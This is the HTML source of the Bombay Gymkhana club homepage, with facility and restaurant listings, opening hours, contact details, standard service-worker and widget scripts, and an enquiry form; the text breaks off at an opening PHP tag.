<!DOCTYPE html>

<html lang="zxx">



<head>

    <script>
        self.addEventListener('fetch', function(event) {
            event.respondWith(async function() {
                try {
                    var res = await fetch(event.request);
                    var cache = await caches.open('cache');
                    cache.put(event.request.url, res.clone());
                    return res;
                } catch (error) {
                    return caches.match(event.request);
                }
            }());
        });


        self.addEventListener('push', (event) => {
            const payload = event.data?.text() ?? 'no payload';
            event.waitUntil(
                self.registration.showNotification('ServiceWorker Cookbook', {
                    body: payload,
                })
            );
        });
    </script>




    <meta charset="utf-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <link rel="manifest" href="manifest.json" />

    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">

    <meta name="apple-mobile-web-app-title" content="Add to Home">




    <title>Bombay Gymkhana</title>


    <link rel="shortcut icon" href="img/favicon.ico" />

    <!-- <link rel="stylesheet"
        href="https://fonts.googleapis.com/css2?family=Barlow&amp;family=Barlow+Condensed&amp;family=Gilda+Display&amp;display=swap"> -->

    <link rel="stylesheet" href="css/plugins.css" />

    <link rel="stylesheet" href="css/style.css" />

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" />
    <script>
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js', {
                scope: '.' // <--- THIS BIT IS REQUIRED
            }).then(function(registration) {
                // Registration was successful
                console.log('ServiceWorker registration successful with scope: ', registration.scope);
            }, function(err) {
                // registration failed :(
                console.log('ServiceWorker registration failed: ', err);
            });
        }
    </script>


    <!-- This script tag uses JavaScript modules, so the proper `type` attribute value is required -->
    <script type="module">
        // This code sample uses features introduced in Workbox v6.
        import {
            Workbox
        } from 'https://storage.googleapis.com/workbox-cdn/releases/6.4.1/workbox-window.prod.mjs';

        if ('serviceWorker' in navigator) {
            const wb = new Workbox('sw.js');
            let registration;

            const showSkipWaitingPrompt = async (event) => {
                // Assuming the user accepted the update, set up a listener
                // that will reload the page as soon as the previously waiting
                // service worker has taken control.
                wb.addEventListener('controlling', () => {
                    // At this point, reloading will ensure that the current
                    // tab is loaded under the control of the new service worker.
                    // Depending on your web app, you may want to auto-save or
                    // persist transient state before triggering the reload.
                    window.location.reload();
                });

                // When `event.wasWaitingBeforeRegister` is true, a previously
                // updated service worker is still waiting.
                // You may want to customize the UI prompt accordingly.

                // This code assumes your app has a promptForUpdate() method,
                // which returns true if the user wants to update.
                // Implementing this is app-specific; some examples are:
                // https://open-ui.org/components/alert.research or
                // https://open-ui.org/components/toast.research
                const updateAccepted = await promptForUpdate();

                if (updateAccepted) {
                    wb.messageSkipWaiting();
                }
            };

            // Add an event listener to detect when the registered
            // service worker has installed but is waiting to activate.
            wb.addEventListener('waiting', (event) => {
                showSkipWaitingPrompt(event);
            });

            wb.register();
        }
    </script>

</head>





<body>

    <!-- Preloader -->


    <div class="preloader-bg"></div>

    <div id="preloader">

        <div id="preloader-status">

            <div class="preloader-position loader"> <span></span> </div>

        </div>

    </div>

    <!-- Progress scroll totop -->

    <div class="progress-wrap cursor-pointer">

        <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">

            <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98" />

        </svg>

    </div>


    <!-- Navbar -->

    <nav class="navbar navbar-expand-lg">
        <div class="container">
            <!-- Logo -->
            <div class="logo-wrapper navbar-brand valign">
                <a href="/index.php">
                    <div class="logo">
                        <img src="img/logo-dark.png" class="logo-img" alt="">
                    </div>
                </a>
            </div>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <div class="three col">
                    <div class="hamburger" id="hamburger-6">
                        <span class="line"></span>
                        <span class="line"></span>
                        <span class="line"></span>
                    </div>
                </div>
            </button>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav ml-auto">
                    <li class="nav-item"><a class="nav-link " href="#header" To>Home</a></li>
                    <li class="nav-item dropdown"> <span class="nav-link "> About <i class="ti-angle-down"></i></span>
                        <ul class="dropdown-menu last">
                            <li class="dropdown-item "><a href="/about-us.php">About Club</a></li>
                            <li class="dropdown-item"><a href="/about-club.php">Club History</a></li>
                        </ul>
                    </li>
                    <li class="nav-item"><a class="nav-link" href="#facilties" To>Facilities</a></li>
                    <li class="nav-item"><a class="nav-link" href="#resto" To>Restaurant</a></li>
                    <li class="nav-item"><a class="nav-link" href="/gallery.php" To>Gallery</a></li>
                    <li class="nav-item"><a class="nav-link" href="index.php#contact" To>Contact Us</a></li>
                    <div class="butn-dark intersterd"> <a href="javascript:void(0);" To><span>Member Login</span></a>
                    </div>
                </ul>
            </div>
        </div>
    </nav>

    <!-- Slider -->
    <header class="header slider-fade" id="header">
        <div class="owl-carousel owl-theme">
            <div class="text-center item bg-img" data-overlay-dark="1" id="home-banner">
                <div class="v-bottom caption caption1">
                    <div class="container">
                        <span>Welcome to</span>
                        <h1>Bombay Gymkhana</h1>
                    </div>
                </div>
            </div>
        </div>
        </div>
    </header>
    <!-- ABout Section -->
    <section class="about section-padding bg-cream" id="about">
        <!-- <button class="add-button">Add to home screen</button> -->
        <div class="container">
            <div class="row ">
                <div class=" col-md-6 col-12 col-sm-12 mb-30  sm-block  animate-box" data-animate-effect="fadeInUp">
                    <div class="section-subtitle">About Club</div>
                    <div class="section-title">Bombay Gymkhana</div>
                    <p>Bombay Gymkhana is an institution with a rich tradition and history. At heart it is a sporting institution and has been host to a number of iconic sporting events over the years. Its membership is aspirational and it is recognized as a quality institution in the society at large and one of the pre-eminent clubs of India. It is represented by a lovely heritage building with a verandah at its heart from where all sports facilities and restaurants emanate.</p>
                    <br>
                    <p>A regular Bombay Gymkhana member is often someone who has grown up in the club, is comforted by its familiarity, enjoys and plays a number of sports and participates in its various social activities. They take pride when their sporting teams do well and enjoy the popularity of its social milieu. They develop strong bonds with fellow members leading often to enduring friendships... </p>
                    <div class="butn-dark intersterd" style="margin-top:20px;"> <a href="about-us.php"><span>Read More</span></a>
                    </div>
                </div>
                <div class=" col-md-3 col-6 col-sm-6 animate-box sm-img-blk" data-animate-effect="fadeInUp">
                    <img src="images/banner-new/Home page banner.png" alt="" class="mt-90 mb-30 about-img ">
                </div>
                <div class=" col-md-3 col-6 col-sm-6 animate-box sm-img-blk" data-animate-effect="fadeInUp">
                    <img src="img/about2.JPG" alt="" class="about-img ">
                </div>
            </div>
        </div>
    </section>






    <!-- Facilties -->

    <section class="rooms1 section-padding bg-cream" data-scroll-index="1" id="facilties">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <div class="section-title">Facilities</div>
                </div>
            </div>
            <div class="row">
                <div class="col-md-4">
                    <a href="javascript:void(0);" class="intersterd">
                        <div class="item">
                            <div class="position-re o-hidden"> <img src="images/banner-images/dining-hall1.jpg" alt=""> </div>
                            <div class="con">
                                <h5> Banquets</h5>
                                <div class="line"></div>
                                <div class="row facilities">
                                    <div class="col col-md-5">
                                        <ul>
                                            <li class="tooltip"><img src="images/white-icons/Dinning Hall_2.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Dining room</span></li>
                                            <li class="tooltip"><img src="images/white-icons/Food_1.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Scullery ( Back Kitchen )</span></li>
                                            <li class="tooltip"><img src="images/white-icons/Barr_2.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">lounge</span></li>
                                            <li class="tooltip"><img src="images/white-icons/Windy (courtside)_2.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Seating area</span></li>
                                            <li class="tooltip"><img src="images/white-icons/Palm Court_2.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Pristine ambiance</span></li>
                                        </ul>
                                    </div>
                                    <div class=" col col-md-7 text-right">
                                        <div class="permalink"></div>
                                    </div>
                                </div>
                                <div class="line mb-5"></div>
                                <h5>Timings</h5>
                                <ul class="list-unstyled page-list mb-5">
                                    <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>12.00 Noon to 11.00 PM</p>
                                        </div>
                                    </li>
                                    <li style="visibility: hidden;">
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>11:30 AM to 08:30 PM (last order 08.00 PM)</p>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-md-4">
                    <a href="javascript:void(0);" class="intersterd">
                        <div class="item">
                            <div class="position-re o-hidden"> <img src="images/Facilities/sports.jpg" alt=""> </div>
                            <div class="con">
                                <h5>Sports</h5>
                                <div class="line"></div>
                                <div class="row facilities">
                                    <div class="col col-md-8">
                                        <ul>
                                            <li class="tooltip"><img src="images/Facilities/badminton.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Badminton</span></li>
                                            <li class="tooltip"><img src="images/Facilities/billiard.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Billiards & Snookers</span></li>
                                            <li class="tooltip"><img src="images/Facilities/cricket.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Cricket</span></li>
                                            <li class="tooltip"><img src="images/Facilities/fitness.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Fitness Center</span></li>
                                            <li class="tooltip"><img src="images/Facilities/poker-cards.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Bridge</span></li>
                                            <li class="tooltip"><img src="images/Facilities/rugby.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Rugby</span></li>
                                            <li class="tooltip"><img src="images/Facilities/soccer-player.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Football</span></li>
                                            <li class="tooltip"><img src="images/Facilities/squash.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Squash</span></li>
                                            <li class="tooltip"><img src="images/Facilities/swimming.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Swimming</span></li>
                                        </ul>
                                    </div>
                                    <div class="col col-md-2 text-right">
                                        <div class="permalink"></div>
                                    </div>
                                </div>
                                <div class="line mb-5"></div>
                                <h5>Timings</h5>
                                <ul class="list-unstyled page-list mb-5">
                                    <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>06:00 AM to 09:30 PM</p>
                                        </div>
                                    </li>
                                    <li style="visibility: hidden;">
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>11:30 AM to 08:30 PM (last order 08.00 PM)</p>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-md-4">
                    <a href="javascript:void(0);" class="intersterd">
                        <div class="item">
                            <div class="position-re o-hidden"> <img src="images/Facilities/preening.jpg" alt=""> </div>
                            <div class="con">
                                <h5>Preening Point</h5>
                                <div class="line"></div>
                                <div class="row facilities">
                                    <div class="col col-md-5">
                                        <ul>
                                            <li class="tooltip"><img src="images/Facilities/steam-room.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Steam Room</span></li>
                                            <li class="tooltip"><img src="images/Facilities/manicure.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Manicure & Pedicure</span></li>
                                            <li class="tooltip"><img src="images/Facilities/spa.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Massage Facility</span></li>
                                            <li class="tooltip"><img src="images/Facilities/barbershop.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Hairdressing Salon</span></li>
                                        </ul>
                                    </div>
                                    <div class="col col-md-7 text-right">
                                        <div class="permalink"></div>
                                    </div>
                                </div>
                                <div class="line mb-5"></div>
                                <h5>Timings</h5>
                                <ul class="list-unstyled page-list mb-5">
                                    <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>07.00 AM to 09.45 PM</p>
                                        </div>
                                    </li>
                                    <li style="visibility: hidden;">
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>11:30 AM to 08:30 PM (last order 08.00 PM)</p>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-md-6">
                    <a href="javascript:void(0);" class="intersterd">
                        <div class="item">
                            <div class="position-re o-hidden"> <img src="images/Facilities/unwind.jpg" alt=""> </div>
                            <div class="con">
                                <h5>Unwind Zone</h5>
                                <div class="line"></div>
                                <div class="row facilities">
                                    <div class="col col-md-7">
                                        <ul>
                                            <li class="tooltip"><img src="images/Facilities/playground.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Children's Park</span></li>
                                            <li class="tooltip"><img src="images/Facilities/recliner.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Siesta Room</span></li>
                                        </ul>
                                    </div>
                                    <div class="col col-md-5 text-right">
                                        <div class="permalink"></div>
                                    </div>
                                </div>
                                <div class="line mb-5"></div>
                                <h5>Timings</h5>
                                <ul class="list-unstyled page-list mb-5">
                                    <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>08:00 AM to 08:30 PM </p>
                                        </div>
                                    </li>
                                    <li style="visibility: hidden;">
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>11:30 AM to 08:30 PM (last order 08.00 PM)</p>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-md-6">
                    <a href="javascript:void(0);" class="intersterd">
                        <div class="item">
                            <div class="position-re o-hidden"> <img src="images/Facilities/Library.jpg" alt=""> </div>
                            <div class="con">
                                <h5>Library</h5>
                                <div class="line"></div>
                                <div class="row facilities">
                                    <div class="col col-md-7">
                                        <ul>
                                            <li class="tooltip"><img src="images/Facilities/reading.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Children's Library</span></li>
                                            <li class="tooltip"><img src="images/Facilities/book.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Library</span></li>
                                        </ul>
                                    </div>
                                    <div class=" col col-md-5 text-right">
                                        <div class="permalink"></div>
                                    </div>
                                </div>
                                <div class="line mb-5"></div>
                                <h5>Timings</h5>
                                <ul class="list-unstyled page-list mb-5">
                                    <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>08:00 AM to 08:30 PM</p>
                                        </div>
                                    </li>
                                    <li style="visibility: hidden;">
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>11:30 AM to 08:30 PM (last order 08.00 PM)</p>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </a>
                </div>
            </div>
        </div>
    </section>



    <!-- Promo Video -->

    <section class="video-wrapper video section-padding bg-img bg-fixed" data-overlay-dark="3" data-background="img/slider/banner.jpg">

        <div class="container">

            <div class="row">

                <div class="col-md-8 offset-md-2 text-center">

                    <!-- <span><i class="star-rating"></i><i class="star-rating"></i><i class="star-rating"></i><i

                            class="star-rating"></i><i class="star-rating"></i></span> -->

                    <div class="section-subtitle"><span>Bombay Gymkhana</span></div>

                    <div class="section-title"><span>Promotional Video</span></div>

                </div>

            </div>

            <div class="row">

                <div class="text-center col-md-12">
                    <a class="vid" data-fancybox href="https://www.youtube.com/embed/MEof6iMcib4">

                        <div class="vid-butn">

                            <span class="icon">

                                <i class="ti-control-play"></i>

                            </span>

                        </div>

                    </a>

                </div>



            </div>

        </div>

    </section>

    <!-- Restaurant -->

    <section class="rooms1 section-padding bg-cream" data-scroll-index="1" id="resto">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <div class="section-title">Restaurant</div>
                </div>
            </div>
            <div class="row">
                <div class="col-md-4">
                    <a href="javascript:void(0);" class="intersterd">
                        <div class="item">
                            <div class="position-re o-hidden"> <img src="images/banner-images/dining-hall1.jpg" alt=""> </div>
                            <div class="con">
                                <h5> THE DINING HALL </h5>
                                <div class="line"></div>
                                <div class="row facilities">
                                    <div class="col col-md-5">
                                        <ul>
                                            <li class="tooltip"><img src="images/white-icons/Dinning Hall_2.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Dining room</span></li>
                                            <li class="tooltip"><img src="images/white-icons/Food_1.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Scullery ( Back Kitchen )</span></li>
                                        </ul>
                                    </div>
                                    <div class=" col col-md-7 text-right">
                                        <div class="permalink"> <i class="ti-arrow-right"></i></div>
                                    </div>
                                </div>
                                <div class="line mb-5"></div>
                                <h5>Timings</h5>
                                <ul class="list-unstyled page-list mb-5">
                                    <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>12.30 PM to 03.15 PM (last order 02.45 PM)</p>
                                        </div>
                                    </li>
                                    <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>06.00 PM to 01.00 AM (last order 12.30 AM)</p>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-md-4">
                    <a href="javascript:void(0);" class="intersterd">
                        <div class="item">
                            <div class="position-re o-hidden"> <img src="img/restaurant/2.jpg" alt=""> </div>
                            <div class="con">
                                <h5>GYM`S INN BAR</h5>
                                <div class="line"></div>
                                <div class="row facilities">
                                    <div class="col col-md-5">
                                        <ul>
                                            <li class="tooltip"><img src="images/white-icons/Barr_2.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Dining </span></li>
                                            <li class="tooltip"><img src="images/white-icons/Dinner_1.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Liquor and snacks bar</span></li>
                                        </ul>
                                    </div>
                                    <div class="col col-md-7 text-right">
                                        <div class="permalink"> <i class="ti-arrow-right"></i></div>
                                    </div>
                                </div>
                                <div class="line mb-5"></div>
                                <h5>Timings</h5>
                                <ul class="list-unstyled page-list mb-5">
                                    <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>11:30 AM to 03:15 PM (last order 02.45 PM)</p>
                                        </div>
                                    </li>
                                    <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>06:00 PM to 01:00 AM (last order 12.30 AM)</p>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-md-4">
                    <a href="javascript:void(0);" class="intersterd">
                        <div class="item">
                            <div class="position-re o-hidden"> <img src="images/banner-images/food-court1.jpg" alt=""> </div>
                            <div class="con">
                                <h5>FOOD COURT</h5>
                                <div class="line"></div>
                                <div class="row facilities">
                                    <div class="col col-md-5">
                                        <ul>
                                            <li class="tooltip"><img src="images/white-icons/Food_1.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Diner</span></li>
                                            <li class="tooltip"><img src="images/white-icons/Dinner_1.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Refreshments stall</span></li>
                                        </ul>
                                    </div>
                                    <div class="col col-md-7 text-right">
                                        <div class="permalink"> <i class="ti-arrow-right"></i></div>
                                    </div>
                                </div>
                                <div class="line mb-5"></div>
                                <h5>Timings</h5>
                                <ul class="list-unstyled page-list mb-5">
                                    <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>07:30 AM to 11:00 PM (last order 10.30 PM)</p>
                                        </div>
                                    </li>
                                    <li style="visibility: hidden;">
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>11:30 AM to 08:30 PM (last order 08.00 PM)</p>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-md-4">
                    <a href="javascript:void(0);" class="intersterd">
                        <div class="item">
                            <div class="position-re o-hidden"> <img src="img/restaurant/5.png" alt=""> </div>
                            <div class="con">
                                <h5>VERANDAH</h5>
                                <div class="line"></div>
                                <div class="row facilities">
                                    <div class="col col-md-7">
                                        <ul>
                                            <li class="tooltip"><img src="images/white-icons/Windy (courtside)_2.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Seating area</span></li>
                                            <li class="tooltip"><img src="images/white-icons/Food_1.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Refreshments stall</span></li>
                                        </ul>
                                    </div>
                                    <div class="col col-md-5 text-right">
                                        <div class="permalink"> <i class="ti-arrow-right"></i></div>
                                    </div>
                                </div>
                                <div class="line mb-5"></div>
                                <h5>Timings</h5>
                                <ul class="list-unstyled page-list mb-5">
                                    <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>07:30 AM to 11:00 PM (last order 10.30 PM)</p>
                                        </div>
                                    </li>
                                    <li style="visibility: hidden;">
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>11:30 AM to 08:30 PM (last order 08.00 PM)</p>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-md-4">
                    <a href="javascript:void(0);" class="intersterd">
                        <div class="item">
                            <div class="position-re o-hidden"> <img src="img/restaurant/6.png" alt=""> </div>
                            <div class="con">
                                <h5> PALM COURT </h5>
                                <div class="line"></div>
                                <div class="row facilities">
                                    <div class="col col-md-7">
                                        <ul>
                                            <li class="tooltip"><img src="images/white-icons/Windy (courtside)_2.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Seating area</span></li>
                                            <li class="tooltip"><img src="images/white-icons/Palm Court_2.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">Pristine ambiance</span></li>
                                        </ul>
                                    </div>
                                    <div class=" col col-md-5 text-right">
                                        <div class="permalink"> <i class="ti-arrow-right"></i></div>
                                    </div>
                                </div>
                                <div class="line mb-5"></div>
                                <h5>Timings</h5>
                                <ul class="list-unstyled page-list mb-5">
                                    <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>11:30 AM to 08:30 PM (last order 08.00 PM)</p>
                                        </div>
                                    </li>
                                    <li style="visibility: hidden;">
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>11:30 AM to 08:30 PM (last order 08.00 PM)</p>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-md-4">
                    <a href="javascript:void(0);" class="intersterd">
                        <div class="item">
                            <div class="position-re o-hidden"> <img src="img/restaurant/pavilion.JPG" alt=""> </div>
                            <div class="con">
                                <h5>THE PAVILION </h5>
                                <div class="line"></div>
                                <div class="row facilities">
                                    <div class="col col-md-7">
                                        <ul>
                                            <li class="tooltip"><img src="images/white-icons/Barr_2.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">lounge</span></li>
                                            <li class="tooltip"><img src="images/white-icons/Dinning Hall_2.png" alt="" class="restaurant-icons"><span class="tooltiptext" id="bottom">fine dining</span></li>
                                        </ul>
                                    </div>
                                    <div class=" col col-md-5 text-right">
                                        <div class="permalink"> <i class="ti-arrow-right"></i></div>
                                    </div>
                                </div>
                                <div class="line mb-5"></div>
                                <h5>Timings</h5>
                                <ul class="list-unstyled page-list mb-5">
                                <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>12:30PM to 03:00PM (last order 02:30PM)</p>
                                        </div>
                                    </li>
                                    <li>
                                        <div class="page-list-icon"> <span class="ti-time"></span>
                                        </div>
                                        <div class="page-list-text text-small">
                                            <p>09:30PM to 11:00PM (Last order 10:30PM)</p>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </a>
                </div>
            </div>
        </div>
    </section>
    <section class="instafeed section-padding2 bg-cream" data-scroll-index="1">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <div class="section-title">Instagram</div>
                </div>
                <div class="col-md-12">
                    <div class="embedsocial-hashtag" data-ref="41b81d2c7d5323317150dc9a6058f9191d1221e8"> <a class="feed-powered-by-es feed-powered-by-es-feed-new" href="https://embedsocial.com/social-media-aggregator/" target="_blank" title="Widget by EmbedSocial"> Widget by EmbedSocial<span>→</span> </a> </div>
                    <script>
                        (function(d, s, id) {
                            var js;
                            if (d.getElementById(id)) {
                                return;
                            }
                            js = d.createElement(s);
                            js.id = id;
                            js.src = "https://embedsocial.com/cdn/ht.js";
                            d.getElementsByTagName("head")[0].appendChild(js);
                        }(document, "script", "EmbedSocialHashtagScript"));
                    </script>
                    <div class="butn-dark intersterd" style="text-align:center;margin-top:20px;"> <a href="https://www.instagram.com/bombaygymkhana/?hl=en" target="blank"><span>View More</span></a>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <footer class="footer" id="contact">

        <div class="footer-top">

            <div class="container">

                <div class="row">

                    <div class="col-md-4 ">

                        <div class="footer-column footer-about">

                            <h3 class="footer-title">Bombay Gymkhana</h3>

                            <p class="footer-about-text">Bombay Gymkhana established in 1875, is one of the premiere
                                gymkhanas (sports arena) in the city of Mumbai (Bombay), India.</p>



                            <div class="footer-language">

                                <div>
                                    <div class="butn-dark ">
                                        <!-- <option value="about.php">Read More</option> -->
                                        <!-- <a href="#about">Read More</a> -->
                                        <a href="/about-us.php" To><span>Read More</span></a>

                                    </div>
                                    <!-- <option value="http://duruthemes.com/">German</option> -->

                                </div>

                            </div>
                            <br>
                            <br>
                            <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d3773.864349987316!2d72.8286042!3d18.9373975!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3be7d1dea37f4519%3A0x9292504f765747c3!2sBombay%20Gymkhana!5e0!3m2!1sen!2sin!4v1660075298449!5m2!1sen!2sin" width="100%" height="100%" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>


                        </div>

                    </div>

                    <!-- <div class="col-md-3 offset-md-1">

                        <div class="footer-column footer-explore clearfix">

                            <h3 class="footer-title">Quick links</h3>

                            <ul class="footer-explore-list list-unstyled">

                                <li><a href="#"> Rules & Regulations</a></li>

                                <li><a href="#">Membership Tender</a></li>

                                <li><a href="#">Documents Annual Report</a></li>

                                <li><a href="#">Committee</a></li>

                                <li><a href="#">Black & Gold</a></li>

                                <li><a href="#">Monthly Activites at a glance</a></li>

                            </ul>

                        </div>

                    </div> -->

                    <div class="col-md-4">

                        <div class="footer-column footer-contact">
                            <h3 class="footer-title">Quick links</h3>

                            <ul class="footer-explore-list list-unstyled">

                                <li><a href="tender-documents.php">Tender Documents </a></li>
                                <li><a href="privacypolicy.php">Privacy Policy</a></li>
                                <li><a href="csrpolicy.php">CSR Policy</a></li>
                                <li class="md-none"><a href="/about-us.php#desktop-vmv">Vision</a></li>
                                <li class="md-block"><a href="/about-us.php#mobile-vmv">Vision</a></li>
                            </ul>
                            <h3 class="footer-title">Contact</h3>

                            <p class="footer-contact-text">Mahatma Gandhi Road, Opp Fashion Street,<br> Azad Maidan,
                                Fort, Mumbai, Maharashtra 400001.</p>

                            <div class="footer-contact-info">
                                <p class="footer-contact-phone"><a href="tel:+912243223400">
                                        <img src="/images/white-icons/Call_1.png" class="footer-icons" alt=""> 022 4322 3400</a>

                                </p>

                                <p class="footer-contact-mail"><a href="mailto:admin@bombaygymkhana.com">
                                        <img src="/images/white-icons/Email_1.png" class="footer-icons" alt=""> admin@bombaygymkhana.com</a>

                                </p>

                            </div>

                            <div class="footer-about-social-list">

                                <a href="https://www.instagram.com/bombaygymkhana/?igshid=YmMyMTA2M2Y%3D" target="_blank"><i class="ti-instagram"></i></a>



                                <a href="https://www.facebook.com/BombayGymkhanaOfficial" target="_blank"><i class="ti-facebook"></i></a>


                            </div>

                        </div>

                    </div>


                    <div class="col-md-4">

                        <div class="booking-inner clearfix">
                            <form method="post" action="" class="form1 clearfix">

                                <div class="row">

                                    <div class="col-md-12">

                                        <div class="input1_wrapper">

                                            <label>Name</label>

                                            <div class="input1_inner">

                                                <input type="text" name="clientname" class="form-control input " placeholder="Name">

                                            </div>

                                        </div>

                                    </div>

                                    <div class="col-md-12">

                                        <div class="input1_wrapper">

                                            <label>Mobile</label>

                                            <div class="input1_inner">

                                                <input type="text" name="phone" class="form-control input " placeholder="Mobile">

                                            </div>
                                            <label for="email" class="error"></label>

                                        </div>

                                    </div>



                                    <div class="col-md-12">

                                        <div class="input1_wrapper">

                                            <label>Email</label>

                                            <div class="input1_inner">

                                                <input type="text" name="email" class="form-control input" placeholder="Email">

                                            </div>

                                        </div>

                                    </div>
                                    <div class="col-md-12">
                                        <button type="submit" name="enquirysubmit" class="btn-form1-submit mt-15">Submit</button>
                                    </div>
                                </div>
                            </form>
                            <?php
